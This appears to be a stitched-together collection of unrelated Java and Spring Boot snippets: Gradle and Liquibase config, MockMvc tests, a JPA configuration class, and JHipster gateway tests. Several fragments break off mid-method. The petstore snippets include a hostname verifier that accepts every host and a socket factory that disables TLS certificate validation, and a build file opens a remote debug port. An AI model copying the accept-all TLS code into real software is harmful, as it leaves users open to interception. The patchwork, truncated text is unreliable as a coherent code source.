apply plugin: 'org.springframework.boot'

version = '0.0.1-SNAPSHOT'
sourceCompatibility = 11

repositories {
	mavenLocal()
	mavenCentral()
}

dependencies {
	compile('org.springframework.boot:spring-boot-starter-web')
	compile project(':spring-boot:modular:security-module')
	compile project(':spring-boot:modular:booking-module')
	testCompile('org.springframework.boot:spring-boot-starter-test')
}

bootRun{
	jvmArgs = ["-Xdebug", "-Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5006"]
	systemProperties = System.properties
}
--------------------------------------------------------------------------------------------------------
## db.changelog-master.yaml

databaseChangeLog:
- preConditions:
  - runningAs:
      username: sa

- changeSet:
    id: 1
    author: hombergs
    changes:
    - createTable:
        tableName: booking
        columns:
        - column:
            name: id
            type: bigint
            autoIncrement: true
            constraints:
              primaryKey: true
              nullable: false
        - column:
            name: customer_id
            type: bigint
        - column:
            name: flight_number
            type: varchar(50)
            constraints:
              nullable: false

- changeSet:
    id: 2
    author: hombergs
    changes:
    - createTable:
        tableName: customer
        columns:
        - column:
            name: id
            type: bigint
            autoIncrement: true
            constraints:
              primaryKey: true
              nullable: false
        - column:
            name: name
            type: varchar(50)
            constraints:
              nullable: false

- changeSet:
    id: 3
    author: hombergs
    changes:
    - createTable:
        tableName: flight
        columns:
        - column:
            name: flight_number
            type: varchar(50)
            constraints:
              nullable: false
        - column:
            name: airline
            type: varchar(50)
            constraints:
              nullable: false


- changeSet:
    id: 4
    author: hombergs
    changes:
    - createTable:
        tableName: user
        columns:
        - column:
            name: id
            type: bigint
            autoIncrement: true
            constraints:
              primaryKey: true
              nullable: false
        - column:
            name: name
            type: varchar(50)
            constraints:
              nullable: false
        - column:
            name: email
            type: varchar(50)
            constraints:
              nullable: false
        - column:
            name: registration_date
            type: timestamp
            constraints:
              nullable: false

- changeSet:
    id: 5
    author: hombergs
    changes:
    - createSequence:
        sequenceName: hibernate_sequence
--------------------------------------------------------------------------------------------------------
@RunWith(SpringJUnit4ClassRunner.class)
@WebAppConfiguration
@ContextConfiguration(classes = MyWebConfig.class)
public class ControllerTest {

    @Autowired
    private WebApplicationContext wac;
    private MockMvc mockMvc;

    @Before
    public void setup () {
        DefaultMockMvcBuilder builder = MockMvcBuilders.webAppContextSetup(this.wac);
        this.mockMvc = builder.build();
    }

    @Test
    public void testUserController () throws Exception {
        MockHttpServletRequestBuilder builder =
                                      MockMvcRequestBuilders.post("/test")
                                        .header("testHeader",
                                                "headerValue")
                                        .content("test body");
        this.mockMvc.perform(builder)
                    .andExpect(MockMvcResultMatchers.status()
                                                    .isOk())
                    .andDo(MockMvcResultHandlers.print());
--------------------------------------------------------------------------------------------------------
@RunWith(SpringJUnit4ClassRunner.class)
@WebAppConfiguration
@ContextConfiguration(classes = MyWebConfig.class)
public class ControllerTest {

    @Autowired
    private WebApplicationContext wac;
    private MockMvc mockMvc;

    @Before
    public void setup () {
        DefaultMockMvcBuilder builder = MockMvcBuilders.webAppContextSetup(this.wac);
        this.mockMvc = builder.build();
    }

    @Test
    public void testUserController () throws Exception {

        MockHttpServletRequestBuilder builder =
                                   MockMvcRequestBuilders.post("/user")
                                        .header("testHeader",
                                                "headerValue")
                                        .contentType(MediaType.APPLICATION_JSON)
                                        .content(createUserInJson("joe",
                                                            "joe@example.com"));
        this.mockMvc.perform(builder)
                    .andExpect(MockMvcResultMatchers.status()
                                                    .isOk())
                    .andDo(MockMvcResultHandlers.print());
    }

    private static String createUserInJson (String name, String email) {
        return "{ \"name\": \"" + name + "\", " +
                            "\"emailAddress\":\"" + email + "\"}";
    }
}
--------------------------------------------------------------------------------------------------------
package org.afc.petstore.ssl;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.SSLSession;

public class AcceptAllHostnameVerifier implements HostnameVerifier {

	@Override
	public boolean verify(String hostname, SSLSession session) {
		return true;
	}
}
--------------------------------------------------------------------------------------------------------
package org.afc.petstore.ssl;

import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;

import org.springframework.cloud.commons.httpclient.OkHttpClientFactory;

public class SSLSocketFactoryUtil {

	public static SSLSocketFactory newAcceptAll() {
		try {
			TrustManager[] tm = new TrustManager[] { new OkHttpClientFactory.DisableValidationTrustManager() };
			SSLContext context = SSLContext.getInstance("TLS");
			context.init(null, tm, null);
			return context.getSocketFactory();
		} catch (Exception e) {
			throw new RuntimeException(e);
		}
	}
}
--------------------------------------------------------------------------------------------------------
package org.afc.petstore;

import org.afc.env.Environment;
import org.afc.util.ClasspathUtil;

public class PetstoreLocal {

	public static void main(String[] args) throws Exception {
		Environment.set("petstore", "local", "vi", "default", "vi1");
		ClasspathUtil.addSystemClasspath("target/config");
		Petstore.main(new String[] {"--spring.profiles.active=local,default,vi,vi1"});
	}
}
--------------------------------------------------------------------------------------------------------
import javax.validation.ConstraintViolation;
import javax.validation.ConstraintViolationException;
import javax.validation.Validation;
import javax.validation.Validator;
import javax.validation.ValidatorFactory;

import java.util.Set;

import io.reflectoring.validation.Input;
import org.springframework.stereotype.Service;

@Service
public class ProgrammaticallyValidatingService {

  private Validator validator;

  public ProgrammaticallyValidatingService(Validator validator) {
    this.validator = validator;
  }

  public void validateInput(Input input) {
    ValidatorFactory factory = Validation.buildDefaultValidatorFactory();
    Validator validator = factory.getValidator();
    Set<ConstraintViolation<Input>> violations = validator.validate(input);
    if (!violations.isEmpty()) {
      throw new ConstraintViolationException(violations);
    }
  }

  public void validateInputWithInjectedValidator(Input input) {
    Set<ConstraintViolation<Input>> violations = validator.validate(input);
    if (!violations.isEmpty()) {
      throw new ConstraintViolationException(violations);
    }
  }
}
--------------------------------------------------------------------------------------------------------
        this.externalFileIds = Stream.concat(this.externalFileIds.stream(), externalFileIds.stream())
                .collect(Collectors.toList());
--------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class)
@SpringBootTest(classes = TestApplication.class, webEnvironment = WebEnvironment.DEFINED_PORT)
public class ExcludeAutoConfigIntegrationTest {
    // ...
}
@SpringBootApplication(exclude=SecurityAutoConfiguration.class)
public class TestApplication {
 
    public static void main(String[] args) {
        SpringApplication.run(TestApplication.class, args);
    }
}
--------------------------------------------------------------------------------------------------------
<configuration>
	<include resource="logback-appender.xml" />
	<include resource="env/${sys.env}/logback-logger.xml" optional="true" />

	<appender name="ASYNC" class="ch.qos.logback.classic.AsyncAppender">
		<appender-ref ref="MAIN" />
	</appender>

	<root level="INFO">
		<appender-ref ref="ASYNC" />
	</root>
</configuration>
--------------------------------------------------------------------------------------------------------
service-config.json
{
	"basePackage": "org.afc.petstore",
	"apiPackage": "org.afc.petstore.api",
	"configPackage": "org.afc.petstore.config",
	"modelPackage": "org.afc.petstore.model",
	"delegatePattern": "true",
	"hideGenerationTimestamp": "true"
}
--------------------------------------------------------------------------------------------------------
	@Bean
    public Docket swaggerSpringMvcPlugin() {
        return new Docket(DocumentationType.SWAGGER_2)
        		.select()
        		.apis(RequestHandlerSelectors.withMethodAnnotation(ApiOperation.class))
        		.build()
        		.securitySchemes(Collections.singletonList(new ApiKey("Bearer", "Authorization", "header")));
    }
--------------------------------------------------------------------------------------------------------
import org.springframework.beans.factory.annotation.Value;
import org.springframework.core.io.Resource;
import org.springframework.stereotype.Component;
import org.tuckey.web.filters.urlrewrite.Conf;
import org.tuckey.web.filters.urlrewrite.UrlRewriteFilter;

import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import java.io.IOException;


@Component
public class MyUrlRewriteFilter extends UrlRewriteFilter {

    private static final String CONFIG_LOCATION = "classpath:/urlrewrite.xml";

    //Inject the Resource from the given location
    @Value(CONFIG_LOCATION)
    private Resource resource;

    //Override the loadUrlRewriter method, and write your own implementation
    @Override
    protected void loadUrlRewriter(FilterConfig filterConfig) throws ServletException {
        try {
            //Create a UrlRewrite Conf object with the injected resource
            Conf conf = new Conf(filterConfig.getServletContext(), resource.getInputStream(), resource.getFilename(), "@@yourOwnSystemId@@");
            checkConf(conf);
        } catch (IOException ex) {
            throw new ServletException("Unable to load URL rewrite configuration file from " + CONFIG_LOCATION, ex);
        }
    }
}

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE urlrewrite PUBLIC "-//tuckey.org//DTD UrlRewrite 4.0//EN"
        "http://www.tuckey.org/res/dtds/urlrewrite4.0.dtd">
<urlrewrite>
    <rule>
        <from>/users/swagger-ui.html</from>
        <to type="passthrough">/swagger-ui.html</to>
    </rule>

    <rule>
        <from>/users/webjars/(.*)</from>
        <to type="passthrough">/webjars/$1</to>
    </rule>

    <rule>
        <from>/users/api-docs</from>
        <to type="passthrough">/api-docs</to>
    </rule>

    <rule>
    <from>/users/configuration/(.*)</from>
    <to type="passthrough">/configuration/$1</to>
    </rule>

    <rule>
    <from>/users/swagger-resources</from>
    <to type="passthrough">/swagger-resources</to>
</rule>
</urlrewrite>
--------------------------------------------------------------------------------------------------------
spring.jpa.properties.hibernate.jdbc.lob.non_contextual_creation=true
 
/*
 * The MIT License
 *
 * Copyright 2017 WildBees Labs.
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */
package com.wildbeeslabs.api.rest.subscription.configuration;

import com.mchange.v2.c3p0.ComboPooledDataSource;
import com.wildbeeslabs.api.rest.common.service.interfaces.IPropertiesConfiguration;

import java.util.Properties;
import javax.naming.NamingException;
import javax.persistence.EntityManagerFactory;
import javax.sql.DataSource;
import java.beans.PropertyVetoException;

import org.hibernate.SessionFactory;
import com.zaxxer.hikari.HikariDataSource;

import org.apache.commons.lang3.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.autoconfigure.jdbc.DataSourceBuilder;
import org.springframework.boot.autoconfigure.jdbc.DataSourceProperties;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Primary;
import org.springframework.data.jpa.repository.config.EnableJpaRepositories;
import org.springframework.orm.jpa.JpaTransactionManager;
import org.springframework.orm.jpa.JpaVendorAdapter;
import org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean;
import org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter;
import org.springframework.transaction.PlatformTransactionManager;
import org.springframework.transaction.annotation.EnableTransactionManagement;
import org.springframework.beans.factory.FactoryBean;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.beans.factory.config.BeanPostProcessor;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.context.support.PropertySourcesPlaceholderConfigurer;
import org.springframework.dao.annotation.PersistenceExceptionTranslationPostProcessor;
import org.springframework.data.jpa.repository.config.EnableJpaAuditing;
import org.springframework.orm.hibernate5.LocalSessionFactoryBean;
import org.springframework.orm.jpa.persistenceunit.DefaultPersistenceUnitManager;
import org.springframework.orm.jpa.persistenceunit.PersistenceUnitManager;
import org.springframework.orm.jpa.support.PersistenceAnnotationBeanPostProcessor;
import org.springframework.scheduling.annotation.EnableAsync;
import org.springframework.jdbc.datasource.DriverManagerDataSource;

/**
 *
 * Application JPA Configuration
 *
 * @author Alex
 * @version 1.0.0
 * @since 2017-08-08
 */
@Configuration("subscriptionJpaConfiguration")
@EnableAutoConfiguration
@EnableAsync
@EnableJpaAuditing
@EnableTransactionManagement
@EnableJpaRepositories(basePackages = {"com.wildbeeslabs.api.rest.subscription.repository"},
        entityManagerFactoryRef = "entityManagerFactory",
        transactionManagerRef = "transactionManager")
//@ImportResource("classpath:hibernate.cfg.xml")
//@PropertySource({"classpath:application.default.yml"})
public class JpaConfiguration {

//    @PersistenceContext(unitName = "ds2", type = PersistenceContextType.TRANSACTION)
//    private EntityManager em;
    @Autowired
    @Qualifier("subscriptionPropertiesConfiguration")
    private IPropertiesConfiguration propertyConfig;

    /**
     * Get Property Source placeholder
     *
     * @return property source placeholder
     */
    @Bean
    public static PropertySourcesPlaceholderConfigurer propertySourcesPlaceholderConfigurer() {
        return new PropertySourcesPlaceholderConfigurer();
    }

    /**
     * Get Default DataSource properties
     *
     * @return default DataSource properties
     */
    @Bean
    @Primary
    @ConfigurationProperties(ignoreInvalidFields = true, prefix = "datasource.subscriptionapp")
    public DataSourceProperties dataSourceProperties() {
        return new DataSourceProperties();
    }

    /**
     * Get DataSource configuration
     *
     * @return DataSource configuration
     */
    @Bean
    public DataSource dataSource() {
        final DataSourceProperties dataSourceProperties = dataSourceProperties();
        HikariDataSource dataSource = (HikariDataSource) DataSourceBuilder
                .create(dataSourceProperties.getClassLoader())
                .driverClassName(dataSourceProperties.getDriverClassName())
                .url(dataSourceProperties.getUrl())
                .username(dataSourceProperties.getUsername())
                .password(dataSourceProperties.getPassword())
                .type(HikariDataSource.class)
                .build();
        // Basic datasource properties
        //dataSource.setAllowPoolSuspension(propertyConfig.getProperty("datasource.subscriptionapp.allowPoolSuspension", Boolean.class));
        //dataSource.setAutoCommit(propertyConfig.getProperty("datasource.subscriptionapp.autoCommit", Boolean.class));
        //dataSource.setMaximumPoolSize(propertyConfig.getProperty("datasource.subscriptionapp.maxPoolSize", Integer.class));
        // MySQL specific properties
        /*dataSource.addDataSourceProperty("cachePrepStmts", propertyConfig.getProperty("datasource.subscriptionapp.cachePrepStmts"));
        dataSource.addDataSourceProperty("prepStmtCacheSize", propertyConfig.getProperty("datasource.subscriptionapp.prepStmtCacheSize"));
        dataSource.addDataSourceProperty("prepStmtCacheSqlLimit", propertyConfig.getProperty("datasource.subscriptionapp.prepStmtCacheSqlLimit"));
        dataSource.addDataSourceProperty("useServerPrepStmts", propertyConfig.getProperty("datasource.subscriptionapp.useServerPrepStmts"));
        dataSource.addDataSourceProperty("useLocalSessionState", propertyConfig.getProperty("datasource.subscriptionapp.useLocalSessionState"));
        dataSource.addDataSourceProperty("useLocalTransactionState", propertyConfig.getProperty("datasource.subscriptionapp.useLocalTransactionState"));
        dataSource.addDataSourceProperty("rewriteBatchedStatements", propertyConfig.getProperty("datasource.subscriptionapp.rewriteBatchedStatements"));
        dataSource.addDataSourceProperty("cacheResultSetMetadata", propertyConfig.getProperty("datasource.subscriptionapp.cacheResultSetMetadata"));
        dataSource.addDataSourceProperty("cacheServerConfiguration", propertyConfig.getProperty("datasource.subscriptionapp.cacheServerConfiguration"));
        dataSource.addDataSourceProperty("elideSetAutoCommits", propertyConfig.getProperty("datasource.subscriptionapp.elideSetAutoCommits"));
        dataSource.addDataSourceProperty("maintainTimeStats", propertyConfig.getProperty("datasource.subscriptionapp.maintainTimeStats"));
        dataSource.addDataSourceProperty("allowUrlInLocalInfile", propertyConfig.getProperty("datasource.subscriptionapp.allowUrlInLocalInfile"));
        dataSource.addDataSourceProperty("useReadAheadInput", propertyConfig.getProperty("datasource.subscriptionapp.useReadAheadInput"));
        dataSource.addDataSourceProperty("useUnbufferedIO", propertyConfig.getProperty("datasource.subscriptionapp.useUnbufferedIO"));*/
        return dataSource;
    }

    /**
     * Get Combo pool DataSource configuration
     *
     * @return DataSource configuration
     * @throws java.beans.PropertyVetoException
     */
    //@Bean
    public DataSource dataSource2() throws PropertyVetoException {
        final ComboPooledDataSource dataSource2 = new ComboPooledDataSource();
        dataSource2.setAcquireIncrement(propertyConfig.getProperty("datasource.subscriptionapp.acquireIncrement", Integer.class));
        dataSource2.setMaxStatementsPerConnection(propertyConfig.getProperty("datasource.subscriptionapp.maxStatementsPerConnection", Integer.class));
        dataSource2.setMaxStatements(propertyConfig.getProperty("datasource.subscriptionapp.maxStatements", Integer.class));
        dataSource2.setMaxPoolSize(propertyConfig.getProperty("datasource.subscriptionapp.maxPoolSize", Integer.class));
        dataSource2.setMinPoolSize(propertyConfig.getProperty("datasource.subscriptionapp.minPoolSize", Integer.class));
        dataSource2.setJdbcUrl(propertyConfig.getMandatoryProperty("datasource.subscriptionapp.url"));
        dataSource2.setUser(propertyConfig.getMandatoryProperty("datasource.subscriptionapp.username"));
        dataSource2.setPassword(propertyConfig.getMandatoryProperty("datasource.subscriptionapp.password"));
        dataSource2.setDriverClass(propertyConfig.getMandatoryProperty("datasource.subscriptionapp.driverClassName"));
        return dataSource2;
    }

    /**
     * Get DataSource configuration
     *
     * @return DataSource configuration
     * @throws java.beans.PropertyVetoException
     */
    //@Bean
    public DataSource dataSource3() throws PropertyVetoException {
        final DriverManagerDataSource dataSource = new DriverManagerDataSource();
        dataSource.setDriverClassName(propertyConfig.getMandatoryProperty("datasource.subscriptionapp.driverClassName"));
        dataSource.setUrl(propertyConfig.getMandatoryProperty("datasource.subscriptionapp.url"));
        dataSource.setUsername(propertyConfig.getMandatoryProperty("datasource.subscriptionapp.username"));
        dataSource.setPassword(propertyConfig.getMandatoryProperty("datasource.subscriptionapp.password"));
        return dataSource;
    }

    /**
     * Get Entity Manager Factory bean
     *
     * @return local container emf bean
     * @throws javax.naming.NamingException
     */
    @Bean
    public LocalContainerEntityManagerFactoryBean entityManagerFactory() throws NamingException {
        LocalContainerEntityManagerFactoryBean factoryBean = new LocalContainerEntityManagerFactoryBean();
        factoryBean.setDataSource(dataSource());
        factoryBean.setPackagesToScan(new String[]{"com.wildbeeslabs.api.rest.common.model", "com.wildbeeslabs.api.rest.subscription.model"});
        factoryBean.setJpaVendorAdapter(jpaVendorAdapter());
        factoryBean.setJpaProperties(jpaProperties());
        factoryBean.setPersistenceUnitName("local");
//        factoryBean.setPersistenceUnitManager(persistenceUnitManager());
        return factoryBean;
    }

    /**
     * Get Hibernate JPA adapter
     *
     * @return hibernate JPA adapter
     */
    @Bean
    public JpaVendorAdapter jpaVendorAdapter() {
        HibernateJpaVendorAdapter hibernateJpaVendorAdapter = new HibernateJpaVendorAdapter();
//        hibernateJpaVendorAdapter.setShowSql(true);
//        hibernateJpaVendorAdapter.setGenerateDdl(true);
//        hibernateJpaVendorAdapter.setDatabasePlatform(propertyConfig.getMandatoryProperty("datasource.subscriptionapp.hibernate.dialect"));
        return hibernateJpaVendorAdapter;
    }

    /**
     * Get Persistence exception translation processor
     *
     * @return persistence exception translation processor
     */
    @Bean
    public PersistenceExceptionTranslationPostProcessor exceptionTranslation() {
        return new PersistenceExceptionTranslationPostProcessor();
    }

    /**
     * Get JPA properties configuration
     *
     * @return JPA properties configuration
     */
    private Properties jpaProperties() {
        final Properties properties = new Properties();
        properties.put("hibernate.dialect", propertyConfig.getMandatoryProperty("datasource.subscriptionapp.hibernate.dialect"));
        properties.put("hibernate.hbm2ddl.auto", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.hbm2ddl.method"));
        properties.put("hibernate.show_sql", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.showSql"));
        properties.put("hibernate.format_sql", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.formatSql"));
        properties.put("hibernate.max_fetch_depth", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.maxFetchDepth"));
        properties.put("hibernate.default_batch_fetch_size", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.defaultBatchFetchSize"));
        properties.put("hibernate.default_schema", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.defaultSchema"));
        properties.put("hibernate.globally_quoted_identifiers", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.globallyQuotedIdentifiers"));
        properties.put("hibernate.generate_statistics", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.generateStatistics"));
        properties.put("hibernate.bytecode.use_reflection_optimizer", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.bytecode.useReflectionOptimizer"));

        // Configure Lucene Search
        properties.put("spring.jpa.properties.hibernate.search.default.directory_provider", propertyConfig.getProperty("spring.jpa.properties.hibernate.search.default.directoryProvider"));
        properties.put("spring.jpa.properties.hibernate.search.default.indexBase", propertyConfig.getProperty("spring.jpa.properties.hibernate.search.default.indexBase"));
        properties.put("spring.jpa.properties.hibernate.search.default.batch.merge_factor", propertyConfig.getProperty("spring.jpa.properties.hibernate.search.default.batch.mergeFactor"));
        properties.put("spring.jpa.properties.hibernate.search.default.batch.max_buffered_docs", propertyConfig.getProperty("spring.jpa.properties.hibernate.search.default.batch.maxBufferedDocs"));

        if (StringUtils.isNotEmpty(propertyConfig.getProperty("datasource.subscriptionapp.hibernate.hbm2ddl.importFiles"))) {
            properties.put("hibernate.hbm2ddl.import_files", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.hbm2ddl.importFiles"));
        }

        // Configure Hibernate Cache
        properties.put("hibernate.cache.use_second_level_cache", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.cache.useSecondLevelCache"));
        properties.put("hibernate.cache.use_query_cache", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.cache.useQueryCache"));
        properties.put("hibernate.cache.region.factory_class", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.cache.region.factoryClass"));

        // Configure Connection Pool
        properties.put("hibernate.c3p0.min_size", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.c3p0.minSize"));
        properties.put("hibernate.c3p0.max_size", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.c3p0.maxSize"));
        properties.put("hibernate.c3p0.timeout", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.c3p0.timeout"));
        properties.put("hibernate.c3p0.max_statements", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.c3p0.maxStatements"));
        properties.put("hibernate.c3p0.idle_test_period", propertyConfig.getProperty("datasource.subscriptionapp.hibernate.c3p0.idleTestPeriod"));
        return properties;
    }

    /**
     * Get Transaction Manager
     *
     * @param emf - entity manager factory
     * @return transaction manager
     */
    @Bean
    @Autowired
    public PlatformTransactionManager transactionManager(final EntityManagerFactory emf) {
        JpaTransactionManager txManager = new JpaTransactionManager();
        txManager.setEntityManagerFactory(emf);
        return txManager;
    }

    /**
     * Get Session Factory bean
     *
     * @return session factory bean
     */
    @Bean
    public FactoryBean<SessionFactory> sessionFactory() {
        LocalSessionFactoryBean sessionFactory = new LocalSessionFactoryBean();
        sessionFactory.setDataSource(dataSource());
        return sessionFactory;
    }

    /**
     * Get Persistence Unit Manager
     *
     * @return persistence unit manager
     */
    @Bean
    public PersistenceUnitManager persistenceUnitManager() {
        DefaultPersistenceUnitManager manager = new DefaultPersistenceUnitManager();
        manager.setDefaultDataSource(dataSource());
        return manager;
    }

    /**
     * Get Persistence Annotation processor
     *
     * @return persistence annotation processor
     */
    @Bean
    public BeanPostProcessor postProcessor() {
        PersistenceAnnotationBeanPostProcessor postProcessor = new PersistenceAnnotationBeanPostProcessor();
        return postProcessor;
    }
}

 
package com.baeldung.jhipster.gateway.gateway.responserewriting;

import com.netflix.zuul.context.RequestContext;
import org.apache.commons.io.IOUtils;
import org.junit.Test;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.mock.web.MockHttpServletResponse;

import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.zip.GZIPInputStream;

import static com.baeldung.jhipster.gateway.gateway.responserewriting.SwaggerBasePathRewritingFilter.gzipData;
import static org.junit.Assert.*;
import static springfox.documentation.swagger2.web.Swagger2Controller.DEFAULT_URL;

/**
 * Tests SwaggerBasePathRewritingFilter class.
 */
public class SwaggerBasePathRewritingFilterTest {

    private SwaggerBasePathRewritingFilter filter = new SwaggerBasePathRewritingFilter();

    @Test
    public void shouldFilter_on_default_swagger_url() {

        MockHttpServletRequest request = new MockHttpServletRequest("GET", DEFAULT_URL);
        RequestContext.getCurrentContext().setRequest(request);

        assertTrue(filter.shouldFilter());
    }

    /**
     * Zuul DebugFilter can be triggered by "deug" parameter.
     */
    @Test
    public void shouldFilter_on_default_swagger_url_with_param() {

        MockHttpServletRequest request = new MockHttpServletRequest("GET", DEFAULT_URL);
        request.setParameter("debug", "true");
        RequestContext.getCurrentContext().setRequest(request);

        assertTrue(filter.shouldFilter());
    }

    @Test
    public void shouldNotFilter_on_wrong_url() {

        MockHttpServletRequest request = new MockHttpServletRequest("GET", "/management/info");
        RequestContext.getCurrentContext().setRequest(request);

        assertFalse(filter.shouldFilter());
    }

    @Test
    public void run_on_valid_response() throws Exception {
        MockHttpServletRequest request = new MockHttpServletRequest("GET", "/service1" + DEFAULT_URL);
        RequestContext context = RequestContext.getCurrentContext();
        context.setRequest(request);

        MockHttpServletResponse response = new MockHttpServletResponse();
        context.setResponseGZipped(false);
        context.setResponse(response);

        InputStream in = IOUtils.toInputStream("{\"basePath\":\"/\"}", StandardCharsets.UTF_8);
        context.setResponseDataStream(in);

        filter.run();

        assertEquals("UTF-8", response.getCharacterEncoding());
        assertEquals("{\"basePath\":\"/service1\"}", context.getResponseBody());
    }

    @Test
    public void run_on_valid_response_gzip() throws Exception {
        MockHttpServletRequest request = new MockHttpServletRequest("GET", "/service1" + DEFAULT_URL);
        RequestContext context = RequestContext.getCurrentContext();
        context.setRequest(request);

        MockHttpServletResponse response = new MockHttpServletResponse();
        context.setResponseGZipped(true);
        context.setResponse(response);

        context.setResponseDataStream(new ByteArrayInputStream(gzipData("{\"basePath\":\"/\"}")));

        filter.run();

        assertEquals("UTF-8", response.getCharacterEncoding());

        InputStream responseDataStream = new GZIPInputStream(context.getResponseDataStream());
        String responseBody = IOUtils.toString(responseDataStream, StandardCharsets.UTF_8);
        assertEquals("{\"basePath\":\"/service1\"}", responseBody);
    }
}

 
 
package com.baeldung.jhipster.gateway.config;

import org.springframework.cloud.client.loadbalancer.RestTemplateCustomizer;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Primary;
import org.springframework.security.oauth2.provider.token.TokenStore;
import org.springframework.security.oauth2.provider.token.store.JwtAccessTokenConverter;
import org.springframework.web.client.RestTemplate;

/**
 * Overrides UAA specific beans, so they do not interfere the testing
 * This configuration must be included in @SpringBootTest in order to take effect.
 */
@Configuration
public class SecurityBeanOverrideConfiguration {

    @Bean
    @Primary
    public TokenStore tokenStore() {
        return null;
    }

    @Bean
    @Primary
    public JwtAccessTokenConverter jwtAccessTokenConverter() {
        return null;
    }

    @Bean
    @Primary
    public RestTemplate loadBalancedRestTemplate(RestTemplateCustomizer customizer) {
        return null;
    }
}

 
 
 
package com.baeldung.jhipster.gateway.config;

import com.codahale.metrics.MetricRegistry;
import com.codahale.metrics.servlet.InstrumentedFilter;
import com.codahale.metrics.servlets.MetricsServlet;
import io.github.jhipster.config.JHipsterConstants;
import io.github.jhipster.config.JHipsterProperties;
import io.github.jhipster.web.filter.CachingHttpHeadersFilter;
import io.undertow.Undertow;
import io.undertow.Undertow.Builder;
import io.undertow.UndertowOptions;
import org.apache.commons.io.FilenameUtils;

import org.h2.server.web.WebServlet;
import org.junit.Before;
import org.junit.Test;
import org.springframework.boot.web.embedded.undertow.UndertowServletWebServerFactory;
import org.springframework.http.HttpHeaders;
import org.springframework.mock.env.MockEnvironment;
import org.springframework.mock.web.MockServletContext;
import org.springframework.test.util.ReflectionTestUtils;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.setup.MockMvcBuilders;
import org.xnio.OptionMap;

import javax.servlet.*;
import java.util.*;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.*;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.options;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.header;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * Unit tests for the WebConfigurer class.
 *
 * @see WebConfigurer
 */
public class WebConfigurerTest {

    private WebConfigurer webConfigurer;

    private MockServletContext servletContext;

    private MockEnvironment env;

    private JHipsterProperties props;

    private MetricRegistry metricRegistry;

    @Before
    public void setup() {
        servletContext = spy(new MockServletContext());
        doReturn(mock(FilterRegistration.Dynamic.class))
            .when(servletContext).addFilter(anyString(), any(Filter.class));
        doReturn(mock(ServletRegistration.Dynamic.class))
            .when(servletContext).addServlet(anyString(), any(Servlet.class));

        env = new MockEnvironment();
        props = new JHipsterProperties();

        webConfigurer = new WebConfigurer(env, props);
        metricRegistry = new MetricRegistry();
        webConfigurer.setMetricRegistry(metricRegistry);
    }

    @Test
    public void testStartUpProdServletContext() throws ServletException {
        env.setActiveProfiles(JHipsterConstants.SPRING_PROFILE_PRODUCTION);
        webConfigurer.onStartup(servletContext);

        assertThat(servletContext.getAttribute(InstrumentedFilter.REGISTRY_ATTRIBUTE)).isEqualTo(metricRegistry);
        assertThat(servletContext.getAttribute(MetricsServlet.METRICS_REGISTRY)).isEqualTo(metricRegistry);
        verify(servletContext).addFilter(eq("webappMetricsFilter"), any(InstrumentedFilter.class));
        verify(servletContext).addServlet(eq("metricsServlet"), any(MetricsServlet.class));
        verify(servletContext).addFilter(eq("cachingHttpHeadersFilter"), any(CachingHttpHeadersFilter.class));
